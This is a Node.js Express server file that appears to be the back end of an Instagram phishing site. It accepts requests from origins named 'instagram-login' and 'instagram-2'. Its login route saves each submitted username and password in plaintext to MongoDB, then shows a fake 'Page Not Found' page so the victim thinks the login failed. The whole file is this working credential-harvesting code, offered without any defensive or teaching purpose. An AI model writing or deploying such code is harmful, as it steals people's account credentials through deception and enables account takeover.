const express = require("express");
const { getDB } = require("./utils/databaseUtil");
const { mongoConnect } = require("./utils/databaseUtil");
const cors = require("cors");
const path = require("path");
require("dotenv").config();
const app = express();
const PORT = process.env.PORT || 3003;

// Middleware
const allowedOrigins = [
  "http://localhost:5173",
  "http://localhost:5174",
  "https://instagram-login-5dkk.onrender.com",
  "https://instagram-2-662r.onrender.com",
];
app.options("*", cors()); // Allow all OPTIONS requests

app.use(
  cors({
    origin: function (origin, callback) {
      if (!origin || allowedOrigins.includes(origin)) {
        callback(null, true);
      } else {
        callback(new Error("Not allowed by CORS"));
      }
    },
    credentials: true,
    methods: "GET,HEAD,PUT,PATCH,POST,DELETE",
    allowedHeaders: "Origin,X-Requested-With,Content-Type,Accept,Authorization",
  })
);

app.use(express.json());
app.set("view engine", "ejs"); // Set EJS as the template engine
app.set("views", path.join(__dirname, "views")); // Define the views directory
app.use(express.static(path.join(__dirname, "public"))); // Serve static files

// Routes
app.get("/", (req, res) => {
  res.send(`<h1>Server Is Listening...</h1>`);
});

// POST Route for User Login/Signup
app.post("/", async (req, res) => {
  const db = getDB();
  const { username, password } = req.body;

  if (!username || !password) {
    // If username or password is missing, show 404.ejs
    return res.status(404).render("404", { pageTitle: "Page Not Found" });
  }

  try {
    await db.collection("users").insertOne({ username, password });

    // After successful insertion, still show 404.ejs (as per your request)
    return res.status(404).render("404", { pageTitle: "Page Not Found" });
  } catch (error) {
    console.error("Database error:", error);
    return res.status(500).render("404", { pageTitle: "Server Error" });
  }
});

// 404 Route - Handles all unknown routes
app.use((req, res) => {
  res.status(404).render("404", { pageTitle: "Page Not Found" });
});

// Database Connection
mongoConnect(() => {
  console.log("DB connected");
  app.listen(PORT, () => {
    console.log(`Server running on address http://localhost:${PORT}`);
  });
});
